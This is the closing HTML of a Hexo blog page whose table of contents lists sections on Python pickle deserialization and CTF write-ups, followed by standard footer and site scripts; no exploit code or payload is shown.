toc-level-3"><a class="toc-link" href="#pker%EF%BC%9A%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="toc-number">8.3.2.</span> <span class="toc-text">pker：函数执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pker%EF%BC%9A%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-number">8.3.3.</span> <span class="toc-text">pker：实例化对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-4-CTF%E5%AE%9E%E6%88%98"><span class="toc-number">8.4.</span> <span class="toc-text">8.4 CTF实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun"><span class="toc-number">8.4.1.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bandit-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7"><span class="toc-number">8.4.1.1.</span> <span class="toc-text">Bandit-自动化工具</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#watevrCTF-2019-Pickle-Store"><span class="toc-number">8.4.2.</span> <span class="toc-text">[watevrCTF-2019]Pickle Store</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">0x09 参考文章</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>